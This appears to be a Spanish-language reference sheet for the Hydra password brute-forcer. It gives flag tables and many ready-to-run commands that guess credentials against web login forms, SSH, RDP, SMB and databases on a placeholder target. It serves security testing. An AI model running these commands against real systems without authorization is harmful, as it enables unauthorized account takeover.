# Hydra (THC-Hydra) - Referencia

Brute forcer de credenciales online. Soporta 50+ protocolos incluyendo HTTP forms, SSH, FTP, SMB, RDP, bases de datos y mas.

## Instalacion

```bash
sudo apt install hydra          # Debian/Kali
sudo pacman -S hydra            # Arch
brew install hydra              # macOS
```

## Flags

### Target y Credenciales
| Flag | Descripcion |
|------|-------------|
| `<target>` | IP o hostname objetivo (ultimo argumento) |
| `-l LOGIN` | Usuario unico |
| `-L FILE` | Lista de usuarios |
| `-p PASS` | Password unico |
| `-P FILE` | Lista de passwords |
| `-C FILE` | Archivo combo user:pass |
| `-x MIN:MAX:CHARSET` | Generar passwords (brute force) |
| `-e nsr` | Probar: n=null, s=login as pass, r=reverse login |
| `-u` | Iterar por usuario (en vez de por password) |

### Conexion
| Flag | Descripcion |
|------|-------------|
| `-s PORT` | Puerto custom |
| `-S` | Usar SSL |
| `-O` | Usar SSL legacy (old) |
| `-t TASKS` | Conexiones paralelas (default: 16) |
| `-w TIME` | Wait time entre responses (default: 32s) |
| `-W TIME` | Wait time entre connects |
| `-c TIME` | Wait time por login attempt |
| `-4` | Solo IPv4 |
| `-6` | Solo IPv6 |
| `-v` | Verboso |
| `-V` | Mostrar cada intento |
| `-d` | Debug |

### Config
| Flag | Descripcion |
|------|-------------|
| `-M FILE` | Lista de targets |
| `-o FILE` | Output a archivo |
| `-b FORMAT` | Formato output: text, json, jsonv1 |
| `-f` | Parar cuando primer login encontrado (por host) |
| `-F` | Parar cuando primer login encontrado (global) |
| `-R` | Restaurar sesion anterior |
| `-I` | Ignorar sesion anterior |
| `-q` | No mostrar errores de conexion |

## Protocolos Web Relevantes

| Protocolo | Sintaxis del Servicio |
|-----------|----------------------|
| HTTP GET form | `http-get-form` |
| HTTP POST form | `http-post-form` |
| HTTP GET basic auth | `http-get` |
| HTTP POST | `http-post` |
| HTTP Proxy | `http-proxy` |
| HTTP Proxy NTLM | `http-proxy-ntlm` |

### Sintaxis de http-[get/post]-form

```
"/path:params:condicion_fallo[:opciones]"
```

- `^USER^` = placeholder de usuario
- `^PASS^` = placeholder de password
- Condicion de fallo: `F=texto_en_error` o `S=texto_en_exito`
- Opciones: `H=header:value`, `C=/page:cookie_name:cookie_value`

## Otros Protocolos Utiles

| Protocolo | Uso |
|-----------|-----|
| `ssh` | SSH brute force |
| `ftp` | FTP brute force |
| `mysql` | MySQL brute force |
| `postgres` | PostgreSQL brute force |
| `mssql` | MS SQL Server |
| `rdp` | Remote Desktop |
| `smb` | SMB/CIFS |
| `vnc` | VNC |
| `smtp` | SMTP auth |
| `pop3` | POP3 auth |
| `imap` | IMAP auth |
| `ldap2` / `ldap3` | LDAP auth |
| `snmp` | SNMP community strings |

## Ejemplos Practicos

```bash
# === HTTP FORMS ===

# POST form login (fallo = "Invalid")
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  target.com http-post-form \
  "/login:username=^USER^&password=^PASS^:F=Invalid credentials"

# POST form con cookie CSRF
hydra -l admin -P passwords.txt target.com http-post-form \
  "/login:username=^USER^&password=^PASS^&csrf=TOKEN:F=Login failed:H=Cookie: csrf=TOKEN"

# GET form
hydra -l admin -P passwords.txt target.com http-get-form \
  "/login?user=^USER^&pass=^PASS^:F=Access denied"

# POST form con exito en vez de fallo
hydra -l admin -P passwords.txt target.com http-post-form \
  "/login:user=^USER^&pass=^PASS^:S=Welcome"

# POST JSON (via header custom)
hydra -l admin -P passwords.txt target.com http-post-form \
  '/api/login:{"username"\:"^USER^","password"\:"^PASS^"}:F=unauthorized:H=Content-Type\: application/json'

# HTTP Basic Auth
hydra -l admin -P passwords.txt target.com http-get /admin/

# HTTP Basic Auth con SSL
hydra -l admin -P passwords.txt -s 443 -S target.com http-get /admin/

# === OTROS PROTOCOLOS ===

# SSH
hydra -l root -P passwords.txt target.com ssh

# FTP
hydra -l anonymous -P passwords.txt target.com ftp

# MySQL
hydra -l root -P passwords.txt target.com mysql

# RDP
hydra -l administrator -P passwords.txt target.com rdp -t 4

# SMB
hydra -L users.txt -P passwords.txt target.com smb

# === CONFIGURACION AVANZADA ===

# Lista de usuarios y passwords
hydra -L users.txt -P passwords.txt target.com http-post-form \
  "/login:user=^USER^&pass=^PASS^:F=failed"

# Combo file (user:pass)
hydra -C combos.txt target.com http-post-form \
  "/login:user=^USER^&pass=^PASS^:F=failed"

# Probar null, login-as-pass, reverse
hydra -l admin -P passwords.txt -e nsr target.com ssh

# Limitar velocidad
hydra -l admin -P passwords.txt -t 4 -w 5 target.com http-post-form \
  "/login:user=^USER^&pass=^PASS^:F=Invalid"

# Parar al primer exito
hydra -L users.txt -P passwords.txt -f target.com ssh

# Output a archivo
hydra -l admin -P passwords.txt -o found.txt -b json target.com ssh

# Multiples targets
hydra -l admin -P passwords.txt -M targets.txt ssh

# Puerto custom
hydra -l admin -P passwords.txt -s 2222 target.com ssh

# Restaurar sesion
hydra -R

# Generar passwords (brute force 4-6 chars, lowercase+digits)
hydra -l admin -x 4:6:a1 target.com ssh
```
